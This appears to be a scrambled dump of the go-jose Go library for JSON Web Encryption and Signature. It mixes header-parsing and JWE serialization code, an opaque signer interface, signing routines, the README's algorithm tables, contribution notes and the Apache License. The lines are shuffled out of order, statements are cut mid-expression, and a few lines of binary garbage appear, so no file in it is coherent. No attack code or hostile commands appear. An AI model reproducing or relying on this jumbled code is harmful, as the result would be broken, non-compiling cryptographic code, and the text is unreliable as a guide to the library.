return SignatureAlgorithm(parsed.getString(headerAlgorithm))
 AES key wrap (192)
// not specified.
type CompressionAlgorithm string
// compact form.
h.ExtraHeaders[k] = v2
 AES key wrap (128)
// CompressionAlgorithm represents an algorithm used for plaintext compression.
// library.
certificates []
func curveSize(crv elliptic.Curve) int {
// Content encryption algorithms
"headerKeyID = ""kid""   // string"
"// getEPK extracts parsed ""epk"" from the raw JSON."
"A128KW"")     // ECDH-ES "
"// getSignatureAlgorithm extracts parsed ""alg"" from the raw JSON as a SignatureAlgorithm."
return ContentEncryption(parsed.getString(headerEncryption))
"headerEncryption  = ""enc""  // ContentEncryption"
func (parsed rawHeader) getString(k HeaderKey) string {
"err = fmt.Errorf(""failed to unmarshal JWK: %v: %"
"headerX5c = ""x5c"" // []"
case elliptic.P384():
"// getJWK extracts parsed ""jwk"" from the raw JSON."
 limitations under the License.
func makeRawMessage(b []byte) 
"// Merge headers from src into dst, giving precedence to headers from l."
package jose
"func (parsed rawHeader) set(k HeaderKey, v interface{}) error {"
"// occurs when, for example, a message had an invalid authentication tag or"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"headerAPV = ""apv"" // "
"// getIV extracts parsed ""iv"" frpom the raw JSON."
func (parsed rawHeader) getCompression() CompressionAlgorithm {
"err = fmt.Errorf(""failed to unmarshal value: %v: %"
json.RawMessage {
"return ""P-521"", nil"
"return nil, errors.New(""square/go-jose: no x5c header present in message"")"
func (parsed rawHeader) getP2S() (
"ErrNotSupported = errors.New(""square/go-jose: compact serialization not supported for object"")"
"headerP2S = ""p2s"" // "
var jwk 
v := parsed[headerCritical]
"x509.Certificate, error) {"
func (parsed rawHeader) getByteBuffer(k HeaderKey) (
return parsed.getString(headerNonce)
func (parsed rawHeader) getNonce() string {
// not be validated with the given verify options.
"RSA1_5             = KeyAlgorithm(""RSA1_5"")             // RSA-PKCS1v1.5"
// rawHeader represents the JOSE header for JWE/JWS objects (used for parsing).
"RS256 = SignatureAlgorithm(""RS256"") // RSASSA-PKCS-v1.5 using SHA-256"
 AES key wrap (256)
 HMAC-SHA256 
"ECDH_ES_A256KW     = KeyAlgorithm(""ECDH-ES"
// Header represents the read-only JOSE header for JWE/JWS objects.
h.Nonce = s
div := bits / 8
json.RawMessage
"ErrUnsupportedKeyType = errors.New(""square/go-jose: unsupported key type/format"")"
func (parsed rawHeader) getTag() (
"return ""P-384"", nil"
"return 0, err"
return nil
if !ok 
"EdDSA = SignatureAlgorithm(""EdDSA"")"
rm := json.RawMessage(b)
// ErrCryptoFailure represents an error in cryptographic primitive. This
func (parsed rawHeader) getEPK() (
if len(h.certificates) == 0 {
 HMAC-SHA512 
"return """", fmt.Errorf(""square/go-jose: unsupported/unknown elliptic curve"")"
"HeaderContentType           = ""cty"" // string"
"// it a key of an unrecognized type or with unsupported parameters, such as"
"HeaderType        HeaderKey = ""typ"" // string"
"""gopkg.in/square/go-jose.v2/json"""
"A256GCM       = ContentEncryption(""A256GCM"")       // AES-GCM (256)"
func (dst rawHeader) isSet(k HeaderKey) bool {
"// getString gets a string from the raw JSON, defaulting to """"."
"// getCompression extracts parsed ""zip"" from the raw JSON."
v := parsed[headerEPK]
case headerX5c:
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
// same time we need to receive any extra fields unhandled by this library to
if src == nil {
"A128GCMKW          = KeyAlgorithm(""A128GCMKW"")          // AES-GCM key wrap (128)"
// KeyAlgorithm represents a key management algorithm.
"headerAPU = ""apu"" // "
continue
"func (parsed rawHeader) sanitized() (h Header, err error) {"
 returns the certificate chain present
func (parsed rawHeader) getAlgorithm() KeyAlgorithm {
"headerJWK   = ""jwk""   // "
"ED25519            = KeyAlgorithm(""ED25519"")"
"return 0, nil"
switch k {
byteBuffer ([]byte)
 ok {
"headerCritical    = ""crit"" // []string"
import (
"// getS2C extracts parsed ""p2c"" from the raw JSON."
// Signature algorithms
"return ""P-256"", nil"
 you may not use this file except in compliance with the License.
"err = fmt.Errorf(""failed to unmarshal nonce: %v: %"
v := parsed[headerJWK]
" distributed under the License is distributed on an ""AS IS"" BASIS,"
type ContentType string
var dv interface{}
"ErrUnsupportedAlgorithm = errors.New(""square/go-jose: unknown/unsupported algorithm"")"
"RSA_OAEP           = KeyAlgorithm(""RSA-OAEP"")           // RSA-OAEP-SHA1"
JSONWebKey
return parsed.getByteBuffer(headerAPU)
// Key management algorithms
// Compression algorithms
parsed[k] = makeRawMessage(b)
"A128KW"") // PBES2 "
"RS512 = SignatureAlgorithm(""RS512"") // RSASSA-PKCS-v1.5 using SHA-512"
JSONWebKey 
 HMAC-SHA384 
 HMAC-SHA512 (256)
"for k, v := range "
"PS384 = SignatureAlgorithm(""PS384"") // RSASSA-PSS using SHA384 and MGF1-SHA384"
func (parsed rawHeader) getIV() (
"// getAPV extracts parsed ""apv"" from the raw JSON."
"ES512 = SignatureAlgorithm(""ES512"") // ECDSA using P-521 and SHA-512"
 v == nil {
return
"// some members into particular structs rather than generic maps, but at the"
"return bb, nil"
 Contributing
errcheck
[Individual Contributor License Agreement][1].
golint
 and 
sure all tests pass by running 
and style in order to keep the code as readable as possible. Please also make
If you would like to contribute code to go-jose you can do so through GitHub by
Before your code can be accepted into the project you must also sign the
"When submitting code, please make every effort to follow existing conventions"
", and format your code with "
 [1]: https://spreadsheets.google.com/spreadsheet/viewform
formkey=dDViT2xzUHAwRkI3X3k5Z0lQM091OGc6MQ
We also recommend using 
go test
ndplr=1
go fmt
forking the repository and sending a pull request.
"Protected:    newBuffer(rawProtected),"
obj.recipients = []recipientInfo{
var parsed rawJSONWebEncryption
// rawJSONWebEncryption represents a raw JWE JSON object. Used for parsing/serializing.
"""%s.%s.%s.%s.%s"","
// rawRecipientInfo represents a raw JWE Per-Recipient header JSON object. Used for parsing/serializing.
"tag, err := base64.RawURLEncoding.DecodeString(parts[4])"
"for _, recipient := range obj.recipients {"
if parsed.Header != nil {
// GetAuthData retrieves the (optional) authenticated data attached to the object.
obj.recipients[r].header = parsed.Recipients[r].Header
// FullSerialize serializes an object using the full JSON serialization format.
Ciphertext   
rawHeader 
rawJSONWebEncryption) sanitized() (
EncryptedKey 
"EncryptedKey: newBuffer(obj.recipients[0].encryptedKey),"
var err error
JSONWebEncryption{
func (obj JSONWebEncryption) GetAuthData() []byte {
func (obj JSONWebEncryption) mergedHeaders(recipient 
Iv           
"Header:       recipient.header,"
return nil
// Get the merged header values
out.merge(obj.protected)
"output = append(output, '.')"
raw := 
// Check that there is not a nonce in the unprotected headers
if obj.original != nil 
Unprotected  
"copy(out, obj.aad)"
info := rawRecipientInfo{
" headers.getEncryption() == """" {"
byteBuffer        
obj.tag = parsed.Tag.bytes()
if len(obj.recipients) > 1 {
Header       
return output
"json:""tag,omitempty"""
"output = append(output, []byte(base64.RawURLEncoding.EncodeToString(obj.aad))...)"
// otherwise fields from the protected header will not get picked up.
"base64.RawURLEncoding.EncodeToString(obj.iv),"
"return nil, fmt.Errorf(""square/go-jose: compact JWE format must have five parts"")"
"if strings.HasPrefix(input, ""{"") {"
"original:    parsed,"
return raw.sanitized()
if len(parsed.Recipients) == 0 {
type JSONWebEncryption struct {
Recipients   []rawRecipientInfo 
obj.iv = parsed.Iv.bytes()
" parsed.Recipients[r].Header.getNonce() != """" {"
if len(obj.recipients) != 1 
"""strings"""
"protected = """""
return parseEncryptedFull(input)
type recipientInfo struct {
"Unprotected:  obj.unprotected,"
"Tag:          newBuffer(obj.tag),"
Aad          
// parseEncryptedCompact parses a message in compact format.
raw := rawJSONWebEncryption{
"""encoding/base64"""
"""gopkg.in/square/go-jose.v2/json"""
"return obj, nil"
"iv, err := base64.RawURLEncoding.DecodeString(parts[2])"
"encryptedKey: parsed.EncryptedKey.bytes(),"
obj.protected)
rawJSONWebEncryption
raw.Header = obj.recipients[0].header
out.merge(obj.unprotected)
if nonce := parsed.Header.getNonce()
EncryptedKey string     
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
rawHeader         
if obj.protected != nil {
"parts := strings.Split(input, ""."")"
// parseEncryptedFull parses a message in compact format.
out := rawHeader{}
// Check that there is not a nonce in the unprotected header
header       
if nonce := parsed.Unprotected.getNonce()
output := []byte(protected)
"json:""unprotected,omitempty"""
Tag          
 See the License for the specific language governing permissions and
"aad, iv, ciphertext, tag []byte"
if obj.aad != nil {
"base64.RawURLEncoding.EncodeToString(serializedProtected),"
// Get the additional authenticated data from a JWE object.
rawHeader
"ciphertext, err := base64.RawURLEncoding.DecodeString(parts[3])"
"unprotected: parsed.Unprotected,"
parsed)
"obj.recipients = make([]recipientInfo, len(parsed.Recipients))"
"EncryptedKey: newBuffer(encryptedKey),"
} else {
return out
"return nil, fmt.Errorf(""square/go-jose: invalid protected header: %s, %s"", err, parsed.Protected.base64())"
func parseEncryptedCompact(input string) (
protected = base64.RawURLEncoding.EncodeToString(mustSerializeJSON((obj.protected)))
" nonce != """" {"
headers := obj.mergedHeaders(
"json:""ciphertext,omitempty"""
if parsed.Protected != nil 
if err != nil {
"err := json.Unmarshal(parsed.Protected.bytes(), "
"raw.Recipients = append(raw.Recipients, info)"
var protected string
"json:""recipients,omitempty"""
"""fmt"""
"encryptedKey, err := base64.RawURLEncoding.DecodeString(parts[1])"
original                 
import (
"Ciphertext:   newBuffer(obj.ciphertext),"
"return nil, fmt.Errorf(""square/go-jose: cannot sanitize merged headers: %v (%v)"", err, mergedHeaders)"
func (parsed 
func (obj JSONWebEncryption) computeAuthData() []byte {
serializedProtected := mustSerializeJSON(obj.protected)
if parsed.Recipients[r].Header != nil 
// CompactSerialize serializes an object using the compact serialization format.
 you may not use this file except in compliance with the License.
"base64.RawURLEncoding.EncodeToString(obj.tag)), nil"
"JSONWebEncryption, error) {"
"json:""iv,omitempty"""
" distributed under the License is distributed on an ""AS IS"" BASIS,"
if len(parts) != 5 {
"base64.RawURLEncoding.EncodeToString(obj.recipients[0].encryptedKey),"
"base64.RawURLEncoding.EncodeToString(obj.ciphertext),"
 obj.unprotected != nil 
Header                   Header
return parseEncryptedCompact(input)
raw.EncryptedKey = newBuffer(obj.recipients[0].encryptedKey)
obj.ciphertext = parsed.Ciphertext.bytes()
"rawProtected, err := base64.RawURLEncoding.DecodeString(parts[0])"
"Aad:          newBuffer(obj.aad),"
encryptedKey []byte
 obj.original.Protected != nil {
"return nil, fmt.Errorf(""square/go-jose: message is missing alg/enc headers"")"
"Tag:          newBuffer(tag),"
obj.protected == nil 
"json:""encrypted_key,omitempty"""
return parsed.sanitized()
"obj.Header, err = mergedHeaders.sanitized()"
if recipient != nil {
" Unless required by applicable law or agreed to in writing, software"
input = stripWhitespace(input)
func parseEncryptedFull(input string) (
"// Note: this must be called _after_ we parse the protected header,"
obj := 
// JSONWebEncryption represents an encrypted JWE object after parsing.
mergedHeaders := obj.mergedHeaders(nil)
// recipientInfo represents a raw JWE Per-Recipient header JSON object after parsing.
for r := range parsed.Recipients {
 limitations under the License.
"return nil, err"
"return nil, ErrUnprotectedNonce"
package jose
"EncryptedKey: base64.RawURLEncoding.EncodeToString(recipient.encryptedKey),"
raw.Protected = newBuffer(mustSerializeJSON(obj.protected))
 You may obtain a copy of the License at
"json:""aad,omitempty"""
type rawRecipientInfo struct {
obj.aad = parsed.Aad.bytes()
// sanitized produces a cleaned-up JWE object from the raw JSON.
"return """", ErrNotSupported"
rawJSONWebEncryption{
"header:       parsed.Header,"
"Iv:           newBuffer(iv),"
 len(parsed.Protected.bytes()) > 0 {
" Licensed under the Apache License, Version 2.0 (the ""License"")"
// ParseEncrypted parses an encrypted message in compact or full serialization format.
"json:""header,omitempty"""
// Use flattened serialization
"out := make([]byte, len(obj.aad))"
"Recipients:   []rawRecipientInfo{},"
recipientInfo) rawHeader {
 obj.recipients[0].header != nil {
out.merge(recipient.header)
"func (obj JSONWebEncryption) CompactSerialize() (string, error) {"
return string(mustSerializeJSON(raw))
"Iv:           newBuffer(obj.iv),"
"json:""protected,omitempty"""
type rawJSONWebEncryption struct {
"encryptedKey, err := base64.RawURLEncoding.DecodeString(parsed.Recipients[r].EncryptedKey)"
func (obj JSONWebEncryption) FullSerialize() string {
recipient)
return fmt.Sprintf(
protected = obj.original.Protected.base64()
if parsed.Unprotected != nil {
"protected, unprotected   "
obj.recipients[r].encryptedKey = encryptedKey
     http://www.apache.org/licenses/LICENSE-2.0
} else if obj.protected != nil {
"err := json.Unmarshal([]byte(input), "
Protected    
"if headers.getAlgorithm() == """" "
"Ciphertext:   newBuffer(ciphertext),"
recipients               []recipientInfo
func ParseEncrypted(input string) (
<sup>2. Only available in version 2 of the package</sup>
multiple recipients. It also comes with a small command-line utility
 Algorithm identifier(s)
[ecdsa.PrivateKey](http://golang.org/pkg/crypto/ecdsa/
](https://github.com/square/go-jose/tree/v2/jose-util))
"library, and can be passed to corresponding functions such as "
 RSA-PKCS
HMAC               
 DEF
 AES key wrap               
 Examples
" ES256, ES384, ES512"
 :------------------------- 
"A192KW, ECDH-ES"
 DEFLATE (RFC 1951)         
](https://github.com/square/go-jose/tree/v2/jose-util)
" ECDH, ECDSA                "
reference for this package. The
as an example.
"exported or re-exported in any form or on any media to Iran, North Sudan,"
of [case-insensitive matching](https://www.ietf.org/mail-archive/web/json/current/msg03763.html)).
 Compression                
encoding/json
 dir<sup>1</sup>
standard where possible. The Godoc reference has a list of constants.
 HMAC                       
standard library which uses case-sensitive matching for member names (instead
 :------------------------------
NewSigner
 RSA1_5
 EdDSA<sup>2</sup>
 ECDH-ES<sup>1</sup>
[rsa.PrivateKey](http://golang.org/pkg/crypto/rsa/
style=flat)](https://godoc.org/gopkg.in/square/go-jose.v2)
1v1.5             
PrivateKey)
[doc](https://godoc.org/gopkg.in/square/go-jose.v2)) is the current version:
 EdDSA<sup>1</sup>          
"Syria, Cuba, or North Korea, or to denied persons or entities mentioned on any"
Examples can be found in the Godoc
[![godoc](http://img.shields.io/badge/godoc-version_2-blue.svg
 AES-GCM                    
 RSA-OAEP                   
" A128GCMKW, A192GCMKW, A256GCMKW"
 []byte
 Supported key types
Package jose aims to provide an implementation of the Javascript Object Signing
1v1.5          
"the compact and full serialization formats, and has optional support for"
 ECDH-ES 
style=flat)](https://raw.githubusercontent.com/square/go-jose/master/LICENSE)
 branch ([go-jose.v1](https://gopkg.in/square/go-jose.v1)) will
" RSA-OAEP, RSA-OAEP-256"
 AES-GCM key wrap           
 [ed25519.PublicKey](https://godoc.org/golang.org/x/crypto/ed25519
"still receive backported bug fixes and security fixes, but otherwise"
A256KW
branch=v2)](https://travis-ci.org/square/go-jose)
 Key encryption             
for dealing with JOSE messages in a shell.
[rsa.PublicKey](http://golang.org/pkg/crypto/rsa/
style=flat)](https://godoc.org/gopkg.in/square/go-jose.v1)
" A128GCM, A192GCM, A256GCM "
". Each of these keys can also be wrapped in a JWK if desired, which"
" PS256, PS384, PS512"
"and Encryption set of standards. This includes support for JSON Web Encryption,"
 ECDH-ES
 RSASSA-PSS                 
 Algorithm identifiers(s)
 package from the Go
subdirectory also contains a small command-line utility which might be useful
: We use a forked version of the 
[jwt](https://godoc.org/gopkg.in/square/go-jose.v2/jwt) implementation
"[JSON Web Signature](http://dx.doi.org/10.17487/RFC7515) (RFC 7515), and"
 Overview
<sup>1. Only available in version 2 of the package</sup>
allows attaching a key id.
 Corresponding types
" RS256, RS384, RS512"
"States law, directive or regulation. In particular this software may not be"
"([branch](https://github.com/square/go-jose/tree/v2),"
Disclaimer
"    import ""gopkg.in/square/go-jose.v2"""
 AES key wrap     
"PublicKey), "
[![coverage](https://coveralls.io/repos/github/square/go-jose/badge.svg
contributed by [@shaxbee](https://github.com/shaxbee).
" A128CBC-HS256, A192CBC-HS384, A256CBC-HS512"
 ECDH-ES (direct)           
development is frozen. All new feature development takes place on the 
[JSON Web Token](http://dx.doi.org/10.17487/RFC7519) (RFC 7519).
Tables of supported algorithms are shown below. The library supports both
"A128KW, ECDH-ES"
<sup>1. Not supported in multi-recipient mode</sup>
 Versions
See below for a table of supported algorithms. Algorithm identifiers match
"the U.S. Export Administration Regulations. You may not export, re-export,"
See below for a table of supported key types. These are understood by the
" HS256, HS384, HS512"
" AES, HMAC                  "
"PublicKey), [ed25519.PrivateKey](https://godoc.org/golang.org/x/crypto/ed25519"
 AES-CBC
" A128KW, A192KW, A256KW"
 Content encryption         
NewEncrypter
Note
The implementation follows the
"[JSON Web Encryption](http://dx.doi.org/10.17487/RFC7516) (RFC 7516),"
 -------------------------------
branch. Version 2 also contains additional sub-packages such as the
 Ed25519                    
 RSASSA-PKCS
: This library contains encryption software that is subject to
libraries in other languages.
"JSON Web Signature, and JSON Web Token standards."
US maintained blocked list.
 Signing / MAC              
transfer or download this code or any part of it in violation of any United
 Supported algorithms
This is to avoid differences in interpretation of messages between go-jose and
 RSA                        
[ecdsa.PublicKey](http://golang.org/pkg/crypto/ecdsa/
[![build](https://travis-ci.org/square/go-jose.svg
 ECDSA                      
 Algorithm(s)               
[![license](http://img.shields.io/badge/license-apache_2.0-blue.svg
 Direct encryption          
The old 
branch=v2)](https://coveralls.io/r/square/go-jose)
 Go JOSE 
We use [gopkg.in](https://gopkg.in) for versioning.
jose-util
[Version 2](https://gopkg.in/square/go-jose.v2)
[![godoc](http://img.shields.io/badge/godoc-version_1-blue.svg
the names in the [JSON Web Algorithms](http://dx.doi.org/10.17487/RFC7518)
"""4!nADK<uf"
B3]x
G)8np
D.dB
K[9=
wPog6
"yAI"""
c:u:/p
protected: 
return recipientSigInfo{
// user of this interface.
 limitations under the License.
signer OpaqueSigner
// transparently to the user of this interface.
package jose
// Public returns the public key of the current signing key.
"rawHeader{},"
 You may obtain a copy of the License at
signer: 
type OpaqueSigner interface {
if !algSupported {
// OpaqueVerifier is an interface that supports verifying payloads with opaque
 you may not use this file except in compliance with the License.
" Licensed under the Apache License, Version 2.0 (the ""License"")"
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"out, err := o.signer.SignPayload(payload, alg)"
"SignPayload(payload []byte, alg SignatureAlgorithm) ([]byte, error)"
Algs() []SignatureAlgorithm
"publicKey: signer.Public,"
"signer: signer,"
"VerifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error"
"func newOpaqueSigner(alg SignatureAlgorithm, signer OpaqueSigner) (recipientSigInfo, error) {"
opaqueSigner{
 See the License for the specific language governing permissions and
JSONWebKey
// Algs returns a list of supported signing algorithms.
 Copyright 2018 Square Inc.
type OpaqueVerifier interface {
Public() 
"// private key(s). Private key operations preformed by implementors may, for"
"sigAlg:    alg,"
"opaqueSigner) signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error) {"
// public key(s). An OpaqueSigner may rotate signing keys transparently to the
"}, nil"
// SignPayload signs a payload with the current signing key using the given
algSupported = true
"Signature: out,"
var algSupported bool
type opaqueSigner struct {
"for _, salg := range signer.Algs() {"
     http://www.apache.org/licenses/LICENSE-2.0
if alg == salg {
func (o 
// algorithm.
" Unless required by applicable law or agreed to in writing, software"
type opaqueVerifier struct {
"opaqueVerifier) verifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error {"
break
"// example, occur in a hardware module. An OpaqueSigner may rotate signing keys"
return Signature{
"return recipientSigInfo{}, ErrUnsupportedAlgorithm"
// OpaqueSigner is an interface that supports signing payloads with opaque
"return Signature{}, err"
if err != nil {
verifier OpaqueVerifier
"return o.verifier.VerifyPayload(payload, signature, alg)"
"      To apply the Apache License to your work, attach the following"
      meet the following conditions:
 within the Source form or
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      incidental, or consequential damages of any character arising as a"
"          that You distribute, all copyright, patent, trademark, and"
          the Derivative Works
"      communication on electronic mailing lists, source code control systems,"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      for any such Derivative Works as a whole, provided Your use,"
"      reproduction, and distribution of the Work otherwise complies with"
   2. Grant of Copyright License. Subject to the terms and conditions of
"          or as an addendum to the NOTICE text from the Work, provided"
   4. Redistribution. You may reproduce and distribute copies of the
      may provide additional or different license terms and conditions
      or by an individual or Legal Entity authorized to submit on behalf of
      as of the date such litigation is filed.
"      or contributory patent infringement, then any patent licenses"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
      Contribution(s) alone or by combination of their Contribution(s)
      or other liability obligations and/or rights consistent with this
"      designated in writing by the copyright owner as ""Not a Contribution."""
      subsequently incorporated within the Work.
      with Licensor regarding such Contributions.
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      excluding communication that is conspicuously marked or otherwise
"          documentation, if provided along with the Derivative Works"
"      names, trademarks, service marks, or product names of the Licensor,"
      (a) You must give any other recipients of the Work or
"      same ""printed page"" as the copyright notice for easier"
      comment syntax for the file format. We also recommend that a
"      means any form of electronic, verbal, or written communication sent"
"                           Version 2.0, January 2004"
"      copyright license to reproduce, prepare Derivative Works of,"
      origin of the Work and reproducing the content of the NOTICE file.
"   8. Limitation of Liability. In no event and under no legal theory,"
"      (c) You must retain, in the Source form of any Derivative Works"
          do not modify the License. You may add Your own attribution
"      other entities that control, are controlled by, or are under common"
"          notices within Derivative Works that You distribute, alongside"
                                 Apache License
"      transformation or translation of a Source form, including but"
          that such additional attribution notices cannot be construed
"      incurred by, or claims asserted against, such Contributor by reason"
      the brackets!)  The text should be enclosed in the appropriate
"      Licensor for the purpose of discussing and improving the Work, but"
"      (except as stated in this section) patent license to make, have made,"
   9. Accepting Warranty or Additional Liability. While redistributing
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
          include a readable copy of the attribution notices contained
   APPENDIX: How to apply the Apache License to your work.
"   Licensed under the Apache License, Version 2.0 (the ""License"")"
      file or class name and description of purpose be included on the
"      of any other Contributor, and only if You agree to indemnify,"
      and distribution as defined by Sections 1 through 9 of this document.
 and
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
      Work and such Derivative Works in Source or Object form.
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      of this License, Derivative Works shall not include works that remain"
"      direction or management of such entity, whether by contract or"
"      whether in tort (including negligence), contract, or otherwise,"
      appropriateness of using or redistributing the Work and assume any
"      ""Contribution"" shall mean any work of authorship, including"
      and conversions to other media types.
"      agreed to in writing, Licensor provides the Work (and each"
"      publicly display, publicly perform, sublicense, and distribute the"
      institute patent litigation against any entity (including a
          excluding those notices that do not pertain to any part of
      by You to the Licensor shall be under the terms and conditions of
"      represent, as a whole, an original work of authorship. For the purposes"
      or a Contribution incorporated within the Work constitutes direct
"      source, and configuration files."
   you may not use this file except in compliance with the License.
"      to the Licensor or its representatives, including but not limited to"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"      ""Work"" shall mean the work of authorship, whether in Source or"
      where such license applies only to those patent claims licensable
"      ""Legal Entity"" shall mean the union of the acting entity and all"
   END OF TERMS AND CONDITIONS
      (b) You must cause any modified files to carry prominent notices
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      Work or Derivative Works thereof in any medium, with or without"
          of the NOTICE file are for informational purposes only and
"      for use, reproduction, or distribution of Your modifications, or"
          Derivative Works a copy of this License
"          within a display generated by the Derivative Works, if and"
          as modifying the License.
          wherever such third-party notices normally appear. The contents
      (an example is provided in the Appendix below).
      unless required by applicable law (such as deliberate and grossly
   1. Definitions.
"      to that Work or Derivative Works thereof, that is intentionally"
       http://www.apache.org/licenses/LICENSE-2.0
      submitted to Licensor for inclusion in the Work by the copyright owner
"      including but not limited to software source code, documentation"
"      outstanding shares, or (iii) beneficial ownership of such entity."
      with the Work to which such Contribution(s) was submitted. If You
      the terms of any separate license agreement you may have executed
          as part of the Derivative Works
"      liable to You for damages, including any direct, indirect, special,"
      on behalf of whom a Contribution has been received by Licensor and
"      the Work or Derivative Works thereof, You may choose to offer,"
"      implied, including, without limitation, any warranties or conditions"
      of your accepting any such warranty or additional liability.
"      Object form, made available under the License, as indicated by a"
   See the License for the specific language governing permissions and
"          pertain to any part of the Derivative Works, in at least one"
                        http://www.apache.org/licenses/
      the Work and Derivative Works thereof.
   You may obtain a copy of the License at
"          distribution, then any Derivative Works that You distribute must"
      except as required for reasonable and customary use in describing the
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
      identification within third-party archives.
      You may add Your own copyright statement to Your modifications and
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
          of the following places: within a NOTICE text file distributed
"      control with that entity. For the purposes of this definition,"
"      Work (including but not limited to damages for loss of goodwill,"
"      ""control"" means (i) the power, direct or indirect, to cause the"
      has been advised of the possibility of such damages.
      copyright notice that is included in or attached to the work
"      this License, each Contributor hereby grants to You a perpetual,"
      by such Contributor that are necessarily infringed by their
"          within such NOTICE file, excluding those notices that do not"
      the conditions stated in this License.
   6. Trademarks. This License does not grant permission to use the trade
"      work stoppage, computer failure or malfunction, or any and all"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"   distributed under the License is distributed on an ""AS IS"" BASIS,"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      other commercial damages or losses), even if such Contributor"
"      modifications, and in Source or Object form, provided that You"
   7. Disclaimer of Warranty. Unless required by applicable law or
"      this License, without any additional terms or conditions."
"   Unless required by applicable law or agreed to in writing, software"
"      editorial revisions, annotations, elaborations, or other modifications"
"      ""Source"" form shall mean the preferred form for making modifications,"
      any Contribution intentionally submitted for inclusion in the Work
      risks associated with Your exercise of permissions under this License.
"      not limited to compiled object code, generated documentation,"
      result of this License or out of the use or inability to use the
"      defend, and hold each Contributor harmless for any liability"
      the copyright owner that is granting the License.
          stating that You changed the files
"          attribution notices from the Source form of the Work,"
"      and issue tracking systems that are managed by, or on behalf of, the"
      granted to You under this License for that Work shall terminate
" or,"
"      License. However, in accepting such obligations, You may act only"
      the original version of the Work and any modifications or additions
      replaced with your own identifying information. (Don't include
   3. Grant of Patent License. Subject to the terms and conditions of
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      negligent acts) or agreed to in writing, shall any Contributor be"
   Copyright [yyyy] [name of copyright owner]
"      ""Object"" form shall mean any form resulting from mechanical"
      PARTICULAR PURPOSE. You are solely responsible for determining the
   limitations under the License.
      exercising permissions granted by this License.
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      boilerplate notice, with the fields enclosed by brackets ""[]"""
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      form, that is based on (or derived from) the Work and for which the"
"      separable from, or merely link (or bind by name) to the interfaces of,"
"// separated from each other, and the signature can have multiple signers at the"
case JSONWebKey:
protected[headerKeyID] = recipient.publicKey().KeyID
sigAlg    SignatureAlgorithm
func (obj JSONWebSignature) UnsafePayloadWithoutVerification() []byte {
SignerOptions) WithContentType(contentType ContentType) 
"genericSigner) addRecipient(alg SignatureAlgorithm, signingKey interface{}) error {"
ecEncrypterVerifier{
if err == nil {
// each other.
"critical, err := headers.getCritical()"
EmbedJWK    bool
type payloadSigner interface {
// exclusive. The fact that both can exist at the same time is a somewhat unfortunate
ExtraHeaders map[HeaderKey]interface{}
rawHeader{}
// was created for the inner key (such as a RSA or ECDSA public key). It contains
if ctx.embedJWK {
"// most cases, you will probably want to use Verify instead. DetachedVerify"
"ctx.recipients = append(ctx.recipients, recipient)"
"return newJWKSigner(alg, "
type genericSigner struct {
return nil
if ctx.nonceSource != nil {
// DetachedVerifyMulti is only useful if you have a payload and signature that are
// same time.
signer.nonceSource = opts.NonceSource
type recipientSigInfo struct {
symmetricMac{
"Nonce() (string, error)"
obj.payload = payload
"// This should be impossible, but let's check anyway."
embedJWK     bool
extraHeaders map[HeaderKey]interface{}
"return errors.New(""square/go-jose: too many signatures in payload"
JSONWebSignature{}
// header that contains an embedded JWK while also simultaneously containing the kid
func (ctx 
if !recipient.publicKey().IsPublic() {
// Unsupported crit header
if opts != nil {
serializedProtected := mustSerializeJSON(protected)
"EmbedJWK:     ctx.embedJWK,"
"return -1, Signature{}, err"
"""errors"""
if recipient.publicKey != nil 
genericSigner) Options() SignerOptions {
"""golang.org/x/crypto/ed25519"""
return newVerifier(verificationKey.Key)
signer := 
"err := obj.DetachedVerify(obj.payload, verificationKey)"
headers := signature.mergedHeaders()
"return obj.payload, nil"
return obj.payload
"obj.Signatures = make([]Signature, len(ctx.recipients))"
"return newECDSASigner(alg, signingKey)"
so.ExtraHeaders = map[HeaderKey]interface{}{}
"return i, signature, nil"
"""encoding/base64"""
genericSigner{recipients: []recipientSigInfo{}}
publicKey)
"""gopkg.in/square/go-jose.v2/json"""
"return obj, nil"
case []byte:
"// We want to embed the JWK or set the kid header, but not both. Having a protected"
signatureInfo.protected = 
// object and the payload. We return the signature and index to guarantee that
"signatureInfo, err := recipient.signer.signPayload(input, recipient.sigAlg)"
"// of the signature that was verified, along with the signature object. We return"
"for i, signature := range obj.Signatures {"
// Optional map of additional keys to be inserted into the protected header
"return recipientSigInfo{}, err"
"for k, v := range protected {"
Key       interface{}
"func (obj JSONWebSignature) VerifyMulti(verificationKey interface{}) (int, Signature, []byte, error) {"
return so
type NonceSource interface {
JSONWebKey:
"b, err := json.Marshal(v)"
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
obj.Signatures[i] = signatureInfo
"// returns the index of the signature that was verified, along with the signature"
"signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error)"
"return nil, fmt.Errorf(""square/go-jose: Error marshalling item %"
"return newOpaqueSigner(alg, signer)"
